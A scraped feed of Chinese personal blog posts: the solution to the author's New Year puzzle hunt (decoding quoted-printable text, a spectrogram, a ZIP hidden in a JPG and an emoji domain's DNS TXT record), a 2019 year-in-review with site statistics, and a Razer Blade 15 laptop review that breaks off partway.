href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1542\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"457\" height=\"255\"></a>\n<h1>我的红包</h1>\n<p>相比起来<a href=\"https://flyhigher.top/diary/1464.html\">我的题目</a>就简单很多了嘛…三天时间一共发出了 25 个红包，包括一位重复领取的🌚，比前几年还是多了一些的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"500\" height=\"306\" class=\"aligncenter size-full wp-image-1554\"></a>\n<p><span>这位同学以后请不要多次领取🌚</span></p>\n<p>那么来看看答案吧。</p>\n<h2>第一阶段</h2>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>首先观察字符串，可以发现 <code>.</code> <code>/</code> <code>_</code> 等一些 ASCII 字符原样留在了字符串中，而其他字符被由 <code>=</code> 和十六进制构成的某种编码所替代。如果你正好有所了解，你应该能认出这是 Quoted-printable 编码，这是一种常用于邮件中的编码，可以用<a href=\"https://mothereff.in/quoted-printable\">这个页面</a>解码。如果你不了解，你也应该可以发现这种编码和 URL 编码非常相似。如果你把 <code>=</code> 替换为 <code>%</code>，那么你就可以用各种方法顺利地把它按 URL 编码来进行解码，最后可以得到 <code>αхtоn.іm/соdе_оf_2020_⒈mρз</code>。这个字符串里大部分字符都不是 ASCII 字符，只是长得像而已。根据第一个提示“全是 ASCII 字符”，按样子把字符串用 ASCII 字符抄一遍，可以得到最终 URL 为 <code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, 